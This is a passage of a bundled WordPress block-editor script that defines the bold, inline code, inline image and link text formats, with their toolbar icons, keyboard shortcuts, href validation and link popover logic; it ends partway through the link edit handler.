/******/ (function() { // webpackBootstrap
/******/ 	"use strict";
/******/ 	// The require scope
/******/ 	var __webpack_require__ = {};
/******/ 	
/************************************************************************/
/******/ 	/* webpack/runtime/make namespace object */
/******/ 	!function() {
/******/ 		// define __esModule on exports
/******/ 		__webpack_require__.r = function(exports) {
/******/ 			if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
/******/ 				Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
/******/ 			}
/******/ 			Object.defineProperty(exports, '__esModule', { value: true });
/******/ 		};
/******/ 	}();
/******/ 	
/************************************************************************/
var __webpack_exports__ = {};
// ESM COMPAT FLAG
__webpack_require__.r(__webpack_exports__);

;// CONCATENATED MODULE: external ["wp","richText"]
var external_wp_richText_namespaceObject = window["wp"]["richText"];
;// CONCATENATED MODULE: external ["wp","element"]
var external_wp_element_namespaceObject = window["wp"]["element"];
;// CONCATENATED MODULE: external ["wp","i18n"]
var external_wp_i18n_namespaceObject = window["wp"]["i18n"];
;// CONCATENATED MODULE: external ["wp","blockEditor"]
var external_wp_blockEditor_namespaceObject = window["wp"]["blockEditor"];
;// CONCATENATED MODULE: external ["wp","primitives"]
var external_wp_primitives_namespaceObject = window["wp"]["primitives"];
;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/library/format-bold.js

/**
 * WordPress dependencies
 */

const formatBold = (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.SVG, {
  xmlns: "http://www.w3.org/2000/svg",
  viewBox: "0 0 24 24"
}, (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.Path, {
  d: "M14.7 11.3c1-.6 1.5-1.6 1.5-3 0-2.3-1.3-3.4-4-3.4H7v14h5.8c1.4 0 2.5-.3 3.3-1 .8-.7 1.2-1.7 1.2-2.9.1-1.9-.8-3.1-2.6-3.7zm-5.1-4h2.3c.6 0 1.1.1 1.4.4.3.3.5.7.5 1.2s-.2 1-.5 1.2c-.3.3-.8.4-1.4.4H9.6V7.3zm4.6 9c-.4.3-1 .4-1.7.4H9.6v-3.9h2.9c.7 0 1.3.2 1.7.5.4.3.6.8.6 1.5s-.2 1.2-.6 1.5z"
}));
/* harmony default export */ var format_bold = (formatBold);

;// CONCATENATED MODULE: ./node_modules/@wordpress/format-library/build-module/bold/index.js

/**
 * WordPress dependencies
 */




const bold_name = 'core/bold';
const title = (0,external_wp_i18n_namespaceObject.__)('Bold');
const bold = {
  name: bold_name,
  title,
  tagName: 'strong',
  className: null,
  edit({
    isActive,
    value,
    onChange,
    onFocus
  }) {
    function onToggle() {
      onChange((0,external_wp_richText_namespaceObject.toggleFormat)(value, {
        type: bold_name,
        title
      }));
    }
    function onClick() {
      onChange((0,external_wp_richText_namespaceObject.toggleFormat)(value, {
        type: bold_name
      }));
      onFocus();
    }
    return (0,external_wp_element_namespaceObject.createElement)(external_wp_element_namespaceObject.Fragment, null, (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichTextShortcut, {
      type: "primary",
      character: "b",
      onUse: onToggle
    }), (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichTextToolbarButton, {
      name: "bold",
      icon: format_bold,
      title: title,
      onClick: onClick,
      isActive: isActive,
      shortcutType: "primary",
      shortcutCharacter: "b"
    }), (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.__unstableRichTextInputEvent, {
      inputType: "formatBold",
      onInput: onToggle
    }));
  }
};

;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/library/code.js

/**
 * WordPress dependencies
 */

const code = (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.SVG, {
  viewBox: "0 0 24 24",
  xmlns: "http://www.w3.org/2000/svg"
}, (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.Path, {
  d: "M20.8 10.7l-4.3-4.3-1.1 1.1 4.3 4.3c.1.1.1.3 0 .4l-4.3 4.3 1.1 1.1 4.3-4.3c.7-.8.7-1.9 0-2.6zM4.2 11.8l4.3-4.3-1-1-4.3 4.3c-.7.7-.7 1.8 0 2.5l4.3 4.3 1.1-1.1-4.3-4.3c-.2-.1-.2-.3-.1-.4z"
}));
/* harmony default export */ var library_code = (code);

;// CONCATENATED MODULE: ./node_modules/@wordpress/format-library/build-module/code/index.js

/**
 * WordPress dependencies
 */




const code_name = 'core/code';
const code_title = (0,external_wp_i18n_namespaceObject.__)('Inline code');
const code_code = {
  name: code_name,
  title: code_title,
  tagName: 'code',
  className: null,
  __unstableInputRule(value) {
    const BACKTICK = '`';
    const {
      start,
      text
    } = value;
    const characterBefore = text[start - 1];

    // Quick check the text for the necessary character.
    if (characterBefore !== BACKTICK) {
      return value;
    }
    if (start - 2 < 0) {
      return value;
    }
    const indexBefore = text.lastIndexOf(BACKTICK, start - 2);
    if (indexBefore === -1) {
      return value;
    }
    const startIndex = indexBefore;
    const endIndex = start - 2;
    if (startIndex === endIndex) {
      return value;
    }
    value = (0,external_wp_richText_namespaceObject.remove)(value, startIndex, startIndex + 1);
    value = (0,external_wp_richText_namespaceObject.remove)(value, endIndex, endIndex + 1);
    value = (0,external_wp_richText_namespaceObject.applyFormat)(value, {
      type: code_name
    }, startIndex, endIndex);
    return value;
  },
  edit({
    value,
    onChange,
    onFocus,
    isActive
  }) {
    function onClick() {
      onChange((0,external_wp_richText_namespaceObject.toggleFormat)(value, {
        type: code_name,
        title: code_title
      }));
      onFocus();
    }
    return (0,external_wp_element_namespaceObject.createElement)(external_wp_element_namespaceObject.Fragment, null, (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichTextShortcut, {
      type: "access",
      character: "x",
      onUse: onClick
    }), (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichTextToolbarButton, {
      icon: library_code,
      title: code_title,
      onClick: onClick,
      isActive: isActive,
      role: "menuitemcheckbox"
    }));
  }
};

;// CONCATENATED MODULE: external ["wp","components"]
var external_wp_components_namespaceObject = window["wp"]["components"];
;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/library/keyboard-return.js

/**
 * WordPress dependencies
 */

const keyboardReturn = (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.SVG, {
  xmlns: "http://www.w3.org/2000/svg",
  viewBox: "-2 -2 24 24"
}, (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.Path, {
  d: "M6.734 16.106l2.176-2.38-1.093-1.028-3.846 4.158 3.846 4.157 1.093-1.027-2.176-2.38h2.811c1.125 0 2.25.03 3.374 0 1.428-.001 3.362-.25 4.963-1.277 1.66-1.065 2.868-2.906 2.868-5.859 0-2.479-1.327-4.896-3.65-5.93-1.82-.813-3.044-.8-4.806-.788l-.567.002v1.5c.184 0 .368 0 .553-.002 1.82-.007 2.704-.014 4.21.657 1.854.827 2.76 2.657 2.76 4.561 0 2.472-.973 3.824-2.178 4.596-1.258.807-2.864 1.04-4.163 1.04h-.02c-1.115.03-2.229 0-3.344 0H6.734z"
}));
/* harmony default export */ var keyboard_return = (keyboardReturn);

;// CONCATENATED MODULE: ./node_modules/@wordpress/format-library/build-module/image/index.js

/**
 * WordPress dependencies
 */






const ALLOWED_MEDIA_TYPES = ['image'];
const image_name = 'core/image';
const image_title = (0,external_wp_i18n_namespaceObject.__)('Inline image');
const image_image = {
  name: image_name,
  title: image_title,
  keywords: [(0,external_wp_i18n_namespaceObject.__)('photo'), (0,external_wp_i18n_namespaceObject.__)('media')],
  object: true,
  tagName: 'img',
  className: null,
  attributes: {
    className: 'class',
    style: 'style',
    url: 'src',
    alt: 'alt'
  },
  edit: Edit
};
function InlineUI({
  value,
  onChange,
  activeObjectAttributes,
  contentRef
}) {
  const {
    style
  } = activeObjectAttributes;
  const [width, setWidth] = (0,external_wp_element_namespaceObject.useState)(style?.replace(/\D/g, ''));
  const popoverAnchor = (0,external_wp_richText_namespaceObject.useAnchor)({
    editableContentElement: contentRef.current,
    settings: image_image
  });
  return (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.Popover, {
    placement: "bottom",
    focusOnMount: false,
    anchor: popoverAnchor,
    className: "block-editor-format-toolbar__image-popover"
  }, (0,external_wp_element_namespaceObject.createElement)("form", {
    className: "block-editor-format-toolbar__image-container-content",
    onSubmit: event => {
      const newReplacements = value.replacements.slice();
      newReplacements[value.start] = {
        type: image_name,
        attributes: {
          ...activeObjectAttributes,
          style: width ? `width: ${width}px;` : ''
        }
      };
      onChange({
        ...value,
        replacements: newReplacements
      });
      event.preventDefault();
    }
  }, (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.__experimentalHStack, {
    alignment: "bottom",
    spacing: "0"
  }, (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.__experimentalNumberControl, {
    className: "block-editor-format-toolbar__image-container-value",
    label: (0,external_wp_i18n_namespaceObject.__)('Width'),
    value: width,
    min: 1,
    onChange: newWidth => setWidth(newWidth)
  }), (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.Button, {
    className: "block-editor-format-toolbar__image-container-button",
    icon: keyboard_return,
    label: (0,external_wp_i18n_namespaceObject.__)('Apply'),
    type: "submit"
  }))));
}
function Edit({
  value,
  onChange,
  onFocus,
  isObjectActive,
  activeObjectAttributes,
  contentRef
}) {
  const [isModalOpen, setIsModalOpen] = (0,external_wp_element_namespaceObject.useState)(false);
  function openModal() {
    setIsModalOpen(true);
  }
  function closeModal() {
    setIsModalOpen(false);
  }
  return (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.MediaUploadCheck, null, (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichTextToolbarButton, {
    icon: (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.SVG, {
      xmlns: "http://www.w3.org/2000/svg",
      viewBox: "0 0 24 24"
    }, (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.Path, {
      d: "M4 18.5h16V17H4v1.5zM16 13v1.5h4V13h-4zM5.1 15h7.8c.6 0 1.1-.5 1.1-1.1V6.1c0-.6-.5-1.1-1.1-1.1H5.1C4.5 5 4 5.5 4 6.1v7.8c0 .6.5 1.1 1.1 1.1zm.4-8.5h7V10l-1-1c-.3-.3-.8-.3-1 0l-1.6 1.5-1.2-.7c-.3-.2-.6-.2-.9 0l-1.3 1V6.5zm0 6.1l1.8-1.3 1.3.8c.3.2.7.2.9-.1l1.5-1.4 1.5 1.4v1.5h-7v-.9z"
    })),
    title: image_title,
    onClick: openModal,
    isActive: isObjectActive
  }), isModalOpen && (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.MediaUpload, {
    allowedTypes: ALLOWED_MEDIA_TYPES,
    onSelect: ({
      id,
      url,
      alt,
      width: imgWidth
    }) => {
      closeModal();
      onChange((0,external_wp_richText_namespaceObject.insertObject)(value, {
        type: image_name,
        attributes: {
          className: `wp-image-${id}`,
          style: `width: ${Math.min(imgWidth, 150)}px;`,
          url,
          alt
        }
      }));
      onFocus();
    },
    onClose: closeModal,
    render: ({
      open
    }) => {
      open();
      return null;
    }
  }), isObjectActive && (0,external_wp_element_namespaceObject.createElement)(InlineUI, {
    value: value,
    onChange: onChange,
    activeObjectAttributes: activeObjectAttributes,
    contentRef: contentRef
  }));
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/library/format-italic.js

/**
 * WordPress dependencies
 */

const formatItalic = (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.SVG, {
  xmlns: "http://www.w3.org/2000/svg",
  viewBox: "0 0 24 24"
}, (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.Path, {
  d: "M12.5 5L10 19h1.9l2.5-14z"
}));
/* harmony default export */ var format_italic = (formatItalic);

;// CONCATENATED MODULE: ./node_modules/@wordpress/format-library/build-module/italic/index.js

/**
 * WordPress dependencies
 */




const italic_name = 'core/italic';
const italic_title = (0,external_wp_i18n_namespaceObject.__)('Italic');
const italic = {
  name: italic_name,
  title: italic_title,
  tagName: 'em',
  className: null,
  edit({
    isActive,
    value,
    onChange,
    onFocus
  }) {
    function onToggle() {
      onChange((0,external_wp_richText_namespaceObject.toggleFormat)(value, {
        type: italic_name,
        title: italic_title
      }));
    }
    function onClick() {
      onChange((0,external_wp_richText_namespaceObject.toggleFormat)(value, {
        type: italic_name
      }));
      onFocus();
    }
    return (0,external_wp_element_namespaceObject.createElement)(external_wp_element_namespaceObject.Fragment, null, (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichTextShortcut, {
      type: "primary",
      character: "i",
      onUse: onToggle
    }), (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichTextToolbarButton, {
      name: "italic",
      icon: format_italic,
      title: italic_title,
      onClick: onClick,
      isActive: isActive,
      shortcutType: "primary",
      shortcutCharacter: "i"
    }), (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.__unstableRichTextInputEvent, {
      inputType: "formatItalic",
      onInput: onToggle
    }));
  }
};

;// CONCATENATED MODULE: external ["wp","url"]
var external_wp_url_namespaceObject = window["wp"]["url"];
;// CONCATENATED MODULE: external ["wp","htmlEntities"]
var external_wp_htmlEntities_namespaceObject = window["wp"]["htmlEntities"];
;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/library/link-off.js

/**
 * WordPress dependencies
 */

const linkOff = (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.SVG, {
  xmlns: "http://www.w3.org/2000/svg",
  viewBox: "0 0 24 24"
}, (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.Path, {
  d: "M17.031 4.703 15.576 4l-1.56 3H14v.03l-2.324 4.47H9.5V13h1.396l-1.502 2.889h-.95a3.694 3.694 0 0 1 0-7.389H10V7H8.444a5.194 5.194 0 1 0 0 10.389h.17L7.5 19.53l1.416.719L15.049 8.5h.507a3.694 3.694 0 0 1 0 7.39H14v1.5h1.556a5.194 5.194 0 0 0 .273-10.383l1.202-2.304Z"
}));
/* harmony default export */ var link_off = (linkOff);

;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/library/link.js

/**
 * WordPress dependencies
 */

const link_link = (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.SVG, {
  xmlns: "http://www.w3.org/2000/svg",
  viewBox: "0 0 24 24"
}, (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.Path, {
  d: "M10 17.389H8.444A5.194 5.194 0 1 1 8.444 7H10v1.5H8.444a3.694 3.694 0 0 0 0 7.389H10v1.5ZM14 7h1.556a5.194 5.194 0 0 1 0 10.39H14v-1.5h1.556a3.694 3.694 0 0 0 0-7.39H14V7Zm-4.5 6h5v-1.5h-5V13Z"
}));
/* harmony default export */ var library_link = (link_link);

;// CONCATENATED MODULE: external ["wp","a11y"]
var external_wp_a11y_namespaceObject = window["wp"]["a11y"];
;// CONCATENATED MODULE: external ["wp","data"]
var external_wp_data_namespaceObject = window["wp"]["data"];
;// CONCATENATED MODULE: ./node_modules/@wordpress/format-library/build-module/link/utils.js
/**
 * WordPress dependencies
 */


/**
 * Check for issues with the provided href.
 *
 * @param {string} href The href.
 *
 * @return {boolean} Is the href invalid?
 */
function isValidHref(href) {
  if (!href) {
    return false;
  }
  const trimmedHref = href.trim();
  if (!trimmedHref) {
    return false;
  }

  // Does the href start with something that looks like a URL protocol?
  if (/^\S+:/.test(trimmedHref)) {
    const protocol = (0,external_wp_url_namespaceObject.getProtocol)(trimmedHref);
    if (!(0,external_wp_url_namespaceObject.isValidProtocol)(protocol)) {
      return false;
    }

    // Add some extra checks for http(s) URIs, since these are the most common use-case.
    // This ensures URIs with an http protocol have exactly two forward slashes following the protocol.
    if (protocol.startsWith('http') && !/^https?:\/\/[^\/\s]/i.test(trimmedHref)) {
      return false;
    }
    const authority = (0,external_wp_url_namespaceObject.getAuthority)(trimmedHref);
    if (!(0,external_wp_url_namespaceObject.isValidAuthority)(authority)) {
      return false;
    }
    const path = (0,external_wp_url_namespaceObject.getPath)(trimmedHref);
    if (path && !(0,external_wp_url_namespaceObject.isValidPath)(path)) {
      return false;
    }
    const queryString = (0,external_wp_url_namespaceObject.getQueryString)(trimmedHref);
    if (queryString && !(0,external_wp_url_namespaceObject.isValidQueryString)(queryString)) {
      return false;
    }
    const fragment = (0,external_wp_url_namespaceObject.getFragment)(trimmedHref);
    if (fragment && !(0,external_wp_url_namespaceObject.isValidFragment)(fragment)) {
      return false;
    }
  }

  // Validate anchor links.
  if (trimmedHref.startsWith('#') && !(0,external_wp_url_namespaceObject.isValidFragment)(trimmedHref)) {
    return false;
  }
  return true;
}

/**
 * Generates the format object that will be applied to the link text.
 *
 * @param {Object}  options
 * @param {string}  options.url              The href of the link.
 * @param {string}  options.type             The type of the link.
 * @param {string}  options.id               The ID of the link.
 * @param {boolean} options.opensInNewWindow Whether this link will open in a new window.
 * @param {boolean} options.nofollow         Whether this link is marked as no follow relationship.
 * @return {Object} The final format object.
 */
function createLinkFormat({
  url,
  type,
  id,
  opensInNewWindow,
  nofollow
}) {
  const format = {
    type: 'core/link',
    attributes: {
      url
    }
  };
  if (type) format.attributes.type = type;
  if (id) format.attributes.id = id;
  if (opensInNewWindow) {
    format.attributes.target = '_blank';
    format.attributes.rel = format.attributes.rel ? format.attributes.rel + ' noreferrer noopener' : 'noreferrer noopener';
  }
  if (nofollow) {
    format.attributes.rel = format.attributes.rel ? format.attributes.rel + ' nofollow' : 'nofollow';
  }
  return format;
}

/* eslint-disable jsdoc/no-undefined-types */
/**
 * Get the start and end boundaries of a given format from a rich text value.
 *
 *
 * @param {RichTextValue} value      the rich text value to interrogate.
 * @param {string}        format     the identifier for the target format (e.g. `core/link`, `core/bold`).
 * @param {number?}       startIndex optional startIndex to seek from.
 * @param {number?}       endIndex   optional endIndex to seek from.
 * @return {Object}	object containing start and end values for the given format.
 */
/* eslint-enable jsdoc/no-undefined-types */
function getFormatBoundary(value, format, startIndex = value.start, endIndex = value.end) {
  const EMPTY_BOUNDARIES = {
    start: null,
    end: null
  };
  const {
    formats
  } = value;
  let targetFormat;
  let initialIndex;
  if (!formats?.length) {
    return EMPTY_BOUNDARIES;
  }

  // Clone formats to avoid modifying source formats.
  const newFormats = formats.slice();
  const formatAtStart = newFormats[startIndex]?.find(({
    type
  }) => type === format.type);
  const formatAtEnd = newFormats[endIndex]?.find(({
    type
  }) => type === format.type);
  const formatAtEndMinusOne = newFormats[endIndex - 1]?.find(({
    type
  }) => type === format.type);
  if (!!formatAtStart) {
    // Set values to conform to "start"
    targetFormat = formatAtStart;
    initialIndex = startIndex;
  } else if (!!formatAtEnd) {
    // Set values to conform to "end"
    targetFormat = formatAtEnd;
    initialIndex = endIndex;
  } else if (!!formatAtEndMinusOne) {
    // This is an edge case which will occur if you create a format, then place
    // the caret just before the format and hit the back ARROW key. The resulting
    // value object will have start and end +1 beyond the edge of the format boundary.
    targetFormat = formatAtEndMinusOne;
    initialIndex = endIndex - 1;
  } else {
    return EMPTY_BOUNDARIES;
  }
  const index = newFormats[initialIndex].indexOf(targetFormat);
  const walkingArgs = [newFormats, initialIndex, targetFormat, index];

  // Walk the startIndex "backwards" to the leading "edge" of the matching format.
  startIndex = walkToStart(...walkingArgs);

  // Walk the endIndex "forwards" until the trailing "edge" of the matching format.
  endIndex = walkToEnd(...walkingArgs);

  // Safe guard: start index cannot be less than 0.
  startIndex = startIndex < 0 ? 0 : startIndex;

  // // Return the indicies of the "edges" as the boundaries.
  return {
    start: startIndex,
    end: endIndex
  };
}

/**
 * Walks forwards/backwards towards the boundary of a given format within an
 * array of format objects. Returns the index of the boundary.
 *
 * @param {Array}  formats         the formats to search for the given format type.
 * @param {number} initialIndex    the starting index from which to walk.
 * @param {Object} targetFormatRef a reference to the format type object being sought.
 * @param {number} formatIndex     the index at which we expect the target format object to be.
 * @param {string} direction       either 'forwards' or 'backwards' to indicate the direction.
 * @return {number} the index of the boundary of the given format.
 */
function walkToBoundary(formats, initialIndex, targetFormatRef, formatIndex, direction) {
  let index = initialIndex;
  const directions = {
    forwards: 1,
    backwards: -1
  };
  const directionIncrement = directions[direction] || 1; // invalid direction arg default to forwards
  const inverseDirectionIncrement = directionIncrement * -1;
  while (formats[index] && formats[index][formatIndex] === targetFormatRef) {
    // Increment/decrement in the direction of operation.
    index = index + directionIncrement;
  }

  // Restore by one in inverse direction of operation
  // to avoid out of bounds.
  index = index + inverseDirectionIncrement;
  return index;
}
const partialRight = (fn, ...partialArgs) => (...args) => fn(...args, ...partialArgs);
const walkToStart = partialRight(walkToBoundary, 'backwards');
const walkToEnd = partialRight(walkToBoundary, 'forwards');

;// CONCATENATED MODULE: ./node_modules/@wordpress/format-library/build-module/link/use-link-instance-key.js
// Weakly referenced map allows unused ids to be garbage collected.
const weakMap = new WeakMap();

// Incrementing zero-based ID value.
let id = -1;
const prefix = 'link-control-instance';
function getKey(_id) {
  return `${prefix}-${_id}`;
}

/**
 * Builds a unique link control key for the given object reference.
 *
 * @param {Object} instance an unique object reference specific to this link control instance.
 * @return {string | undefined} the unique key to use for this link control.
 */
function useLinkInstanceKey(instance) {
  if (!instance) {
    return;
  }
  if (weakMap.has(instance)) {
    return getKey(weakMap.get(instance));
  }
  id += 1;
  weakMap.set(instance, id);
  return getKey(id);
}
/* harmony default export */ var use_link_instance_key = (useLinkInstanceKey);

;// CONCATENATED MODULE: ./node_modules/@wordpress/format-library/build-module/link/inline.js

/**
 * WordPress dependencies
 */









/**
 * Internal dependencies
 */



const LINK_SETTINGS = [...external_wp_blockEditor_namespaceObject.__experimentalLinkControl.DEFAULT_LINK_SETTINGS, {
  id: 'nofollow',
  title: (0,external_wp_i18n_namespaceObject.__)('Mark as nofollow')
}];
function InlineLinkUI({
  isActive,
  activeAttributes,
  addingLink,
  value,
  onChange,
  stopAddingLink,
  contentRef
}) {
  const richLinkTextValue = getRichTextValueFromSelection(value, isActive);

  // Get the text content minus any HTML tags.
  const richTextText = richLinkTextValue.text;
  const {
    createPageEntity,
    userCanCreatePages
  } = (0,external_wp_data_namespaceObject.useSelect)(select => {
    const {
      getSettings
    } = select(external_wp_blockEditor_namespaceObject.store);
    const _settings = getSettings();
    return {
      createPageEntity: _settings.__experimentalCreatePageEntity,
      userCanCreatePages: _settings.__experimentalUserCanCreatePages
    };
  }, []);
  const linkValue = (0,external_wp_element_namespaceObject.useMemo)(() => ({
    url: activeAttributes.url,
    type: activeAttributes.type,
    id: activeAttributes.id,
    opensInNewTab: activeAttributes.target === '_blank',
    nofollow: activeAttributes.rel?.includes('nofollow'),
    title: richTextText
  }), [activeAttributes.id, activeAttributes.rel, activeAttributes.target, activeAttributes.type, activeAttributes.url, richTextText]);
  function removeLink() {
    const newValue = (0,external_wp_richText_namespaceObject.removeFormat)(value, 'core/link');
    onChange(newValue);
    stopAddingLink();
    (0,external_wp_a11y_namespaceObject.speak)((0,external_wp_i18n_namespaceObject.__)('Link removed.'), 'assertive');
  }
  function onChangeLink(nextValue) {
    // LinkControl calls `onChange` immediately upon the toggling a setting.
    // Before merging the next value with the current link value, check if
    // the setting was toggled.
    const didToggleSetting = linkValue.opensInNewTab !== nextValue.opensInNewTab && nextValue.url === undefined;
    // Merge the next value with the current link value.
    nextValue = {
      ...linkValue,
      ...nextValue
    };
    const newUrl = (0,external_wp_url_namespaceObject.prependHTTP)(nextValue.url);
    const linkFormat = createLinkFormat({
      url: newUrl,
      type: nextValue.type,
      id: nextValue.id !== undefined && nextValue.id !== null ? String(nextValue.id) : undefined,
      opensInNewWindow: nextValue.opensInNewTab,
      nofollow: nextValue.nofollow
    });
    const newText = nextValue.title || newUrl;
    if ((0,external_wp_richText_namespaceObject.isCollapsed)(value) && !isActive) {
      // Scenario: we don't have any actively selected text or formats.
      const toInsert = (0,external_wp_richText_namespaceObject.applyFormat)((0,external_wp_richText_namespaceObject.create)({
        text: newText
      }), linkFormat, 0, newText.length);
      onChange((0,external_wp_richText_namespaceObject.insert)(value, toInsert));
    } else {
      // Scenario: we have any active text selection or an active format.
      let newValue;
      if (newText === richTextText) {
        // If we're not updating the text then ignore.
        newValue = (0,external_wp_richText_namespaceObject.applyFormat)(value, linkFormat);
      } else {
        // Create new RichText value for the new text in order that we
        // can apply formats to it.
        newValue = (0,external_wp_richText_namespaceObject.create)({
          text: newText
        });

        // Apply the new Link format to this new text value.
        newValue = (0,external_wp_richText_namespaceObject.applyFormat)(newValue, linkFormat, 0, newText.length);

        // Get the boundaries of the active link format.
        const boundary = getFormatBoundary(value, {
          type: 'core/link'
        });

        // Split the value at the start of the active link format.
        // Passing "start" as the 3rd parameter is required to ensure
        // the second half of the split value is split at the format's
        // start boundary and avoids relying on the value's "end" property
        // which may not correspond correctly.
        const [valBefore, valAfter] = (0,external_wp_richText_namespaceObject.split)(value, boundary.start, boundary.start);

        // Update the original (full) RichTextValue replacing the
        // target text with the *new* RichTextValue containing:
        // 1. The new text content.
        // 2. The new link format.
        // As "replace" will operate on the first match only, it is
        // run only against the second half of the value which was
        // split at the active format's boundary. This avoids a bug
        // with incorrectly targetted replacements.
        // See: https://github.com/WordPress/gutenberg/issues/41771.
        // Note original formats will be lost when applying this change.
        // That is expected behaviour.
        // See: https://github.com/WordPress/gutenberg/pull/33849#issuecomment-936134179.
        const newValAfter = (0,external_wp_richText_namespaceObject.replace)(valAfter, richTextText, newValue);
        newValue = (0,external_wp_richText_namespaceObject.concat)(valBefore, newValAfter);
      }
      newValue.start = newValue.end;

      // Hides the Link UI.
      newValue.activeFormats = [];
      onChange(newValue);
    }

    // Focus should only be shifted back to the formatted segment when the
    // URL is submitted.
    if (!didToggleSetting) {
      stopAddingLink();
    }
    if (!isValidHref(newUrl)) {
      (0,external_wp_a11y_namespaceObject.speak)((0,external_wp_i18n_namespaceObject.__)('Warning: the link has been inserted but may have errors. Please test it.'), 'assertive');
    } else if (isActive) {
      (0,external_wp_a11y_namespaceObject.speak)((0,external_wp_i18n_namespaceObject.__)('Link edited.'), 'assertive');
    } else {
      (0,external_wp_a11y_namespaceObject.speak)((0,external_wp_i18n_namespaceObject.__)('Link inserted.'), 'assertive');
    }
  }
  const popoverAnchor = (0,external_wp_richText_namespaceObject.useAnchor)({
    editableContentElement: contentRef.current,
    settings: build_module_link_link
  });

  // Generate a string based key that is unique to this anchor reference.
  // This is used to force re-mount the LinkControl component to avoid
  // potential stale state bugs caused by the component not being remounted
  // See https://github.com/WordPress/gutenberg/pull/34742.
  const forceRemountKey = use_link_instance_key(popoverAnchor);

  // Focus should only be moved into the Popover when the Link is being created or edited.
  // When the Link is in "preview" mode focus should remain on the rich text because at
  // this point the Link dialog is informational only and thus the user should be able to
  // continue editing the rich text.
  // Ref used because the focusOnMount prop shouldn't evolve during render of a Popover
  // otherwise it causes a render of the content.
  const focusOnMount = (0,external_wp_element_namespaceObject.useRef)(addingLink ? 'firstElement' : false);
  async function handleCreate(pageTitle) {
    const page = await createPageEntity({
      title: pageTitle,
      status: 'draft'
    });
    return {
      id: page.id,
      type: page.type,
      title: page.title.rendered,
      url: page.link,
      kind: 'post-type'
    };
  }
  function createButtonText(searchTerm) {
    return (0,external_wp_element_namespaceObject.createInterpolateElement)((0,external_wp_i18n_namespaceObject.sprintf)( /* translators: %s: search term. */
    (0,external_wp_i18n_namespaceObject.__)('Create page: <mark>%s</mark>'), searchTerm), {
      mark: (0,external_wp_element_namespaceObject.createElement)("mark", null)
    });
  }
  return (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.Popover, {
    anchor: popoverAnchor,
    focusOnMount: focusOnMount.current,
    onClose: stopAddingLink,
    onFocusOutside: () => stopAddingLink(false),
    placement: "bottom",
    shift: true
  }, (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.__experimentalLinkControl, {
    key: forceRemountKey,
    value: linkValue,
    onChange: onChangeLink,
    onRemove: removeLink,
    forceIsEditingLink: addingLink,
    hasRichPreviews: true,
    createSuggestion: createPageEntity && handleCreate,
    withCreateSuggestion: userCanCreatePages,
    createSuggestionButtonText: createButtonText,
    hasTextControl: true,
    settings: LINK_SETTINGS
  }));
}
function getRichTextValueFromSelection(value, isActive) {
  // Default to the selection ranges on the RichTextValue object.
  let textStart = value.start;
  let textEnd = value.end;

  // If the format is currently active then the rich text value
  // should always be taken from the bounds of the active format
  // and not the selected text.
  if (isActive) {
    const boundary = getFormatBoundary(value, {
      type: 'core/link'
    });
    textStart = boundary.start;

    // Text *selection* always extends +1 beyond the edge of the format.
    // We account for that here.
    textEnd = boundary.end + 1;
  }

  // Get a RichTextValue containing the selected text content.
  return (0,external_wp_richText_namespaceObject.slice)(value, textStart, textEnd);
}
/* harmony default export */ var inline = (InlineLinkUI);

;// CONCATENATED MODULE: ./node_modules/@wordpress/format-library/build-module/link/index.js

/**
 * WordPress dependencies
 */









/**
 * Internal dependencies
 */


const link_name = 'core/link';
const link_title = (0,external_wp_i18n_namespaceObject.__)('Link');
function link_Edit({
  isActive,
  activeAttributes,
  value,
  onChange,
  onFocus,
  contentRef
}) {
  const [addingLink, setAddingLink] = (0,external_wp_element_namespaceObject.useState)(false);
  function addLink() {
    const text = (0,external_wp_richText_namespaceObject.getTextContent)((0,external_wp_richText_namespaceObject.slice)(value));
    if (text && (0,external_wp_url_namespaceObject.isURL)(text) && isValidHref(text)) {
      onChange((0,external_wp_richText_namespaceObject.applyFormat)(value, {
        type: link_name,
        attributes: {
          url: text
        }
      }));
